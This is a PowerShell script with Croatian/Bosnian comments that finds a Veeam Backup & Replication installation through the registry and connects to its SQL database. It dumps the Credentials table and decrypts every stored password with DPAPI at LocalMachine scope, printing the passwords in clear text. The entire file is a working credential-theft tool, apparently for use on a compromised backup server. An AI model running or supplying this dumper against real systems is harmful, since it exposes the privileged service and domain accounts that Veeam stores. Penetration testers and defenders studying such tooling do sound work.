# pokupi veeam verziju
function Get-VeeamVersion($InstallPath) {
    try {
        Add-Type -LiteralPath "$InstallPath\Veeam.Backup.Configuration.dll"
        $ProductData = [Veeam.Backup.Configuration.BackupProduct]::Create()
        $Version = $ProductData.ProductVersion.ToString()
        if ($ProductData.MarketName -ne "") {
            $Version += " $($ProductData.MarketName)"
        }
        return $Version
    } catch {
        return $null
    }
}

# Registry pathovi
$InstallPath = Get-ItemProperty -Path "HKLM:\Software\Veeam\Veeam Backup and Replication\" | Select -ExpandProperty CorePath

$VeeamRegPath1 = "HKLM:\SOFTWARE\Veeam\Veeam Backup and Replication\" # Veeam 10, 11
$VeeamRegPath2 = "HKLM:\SOFTWARE\Veeam\Veeam Backup and Replication\DatabaseConfigurations\MsSql\" # Veeam BR 12 or higher

$VeeamVersion = Get-VeeamVersion -InstallPath $InstallPath

if ([version]::Parse($VeeamVersion) -ge [version]::Parse("12.0")) {
    $VeeamRegPath = $VeeamRegPath2
} else {
    $VeeamRegPath = $VeeamRegPath1
}

$SqlDatabaseName = $null
$SqlInstanceName = $null
$SqlServerName = $null

# conn parametri
function Get-VeeamConnectionParameters($regPath) {
    try {
        $registryKey = Get-ItemProperty -Path $regPath -ErrorAction Stop
        $SqlDatabaseName = $registryKey.SqlDatabaseName
        $SqlInstanceName = $registryKey.SqlInstanceName
        $SqlServerName = $registryKey.SqlServerName
        return $true, $SqlDatabaseName, $SqlInstanceName, $SqlServerName
    } catch {
        return $false, $null, $null, $null
    }
}

$success, $SqlDatabaseName, $SqlInstanceName, $SqlServerName = Get-VeeamConnectionParameters -regPath $VeeamRegPath

if (-not $success) {
    Write-Host "Nisam mogao isctitat registry parametre, da li runas kao admin?"
}

# Pokazi gdje se spajas ako ides na drugi nece moci jer dekripcija idemo preo DPAPI-ja
Write-Host ""
Write-Host "Veeam found $($SqlServerName) $($SqlInstanceName)@$($SqlDatabaseName), connecting..."

# query za password dump
$SQL = "SELECT [user_name] AS 'User name',[password] AS 'Password' FROM [$SqlDatabaseName].[dbo].[Credentials] WHERE password <> ''"
$auth = "Integrated Security=SSPI;"
$connectionString = "Provider=sqloledb; Data Source=$SqlServerName\$SqlInstanceName; Initial Catalog=$SqlDatabaseName; $auth; "
$connection = New-Object System.Data.OleDb.OleDbConnection $connectionString
$command = New-Object System.Data.OleDb.OleDbCommand $SQL, $connection

try {
    $connection.Open()
    $adapter = New-Object System.Data.OleDb.OleDbDataAdapter $command
    $dataset = New-Object System.Data.DataSet
    [void] $adapter.Fill($dataSet)
    $connection.Close()
} catch {
    Write-Host "Connection failed. RIP!"
    exit -1
}

Write-Host "OK"
$rows = $dataset.Tables | Select-Object -Expand Rows

if ($rows.count -eq 0) {
    Write-Host "Nisam pronasao passworde"
    exit
}

Write-Host ""
Write-Host "Passwords mmmmmm:"
$rows | ForEach-Object {
    $EncryptedPWD = [Convert]::FromBase64String($_.password)
    $ClearPWD = [System.Security.Cryptography.ProtectedData]::Unprotect($EncryptedPWD, $null, [System.Security.Cryptography.DataProtectionScope]::LocalMachine)
    $enc = [system.text.encoding]::Default
    $_.password = $enc.GetString($ClearPWD)
}

$rows | Format-Table | Out-String
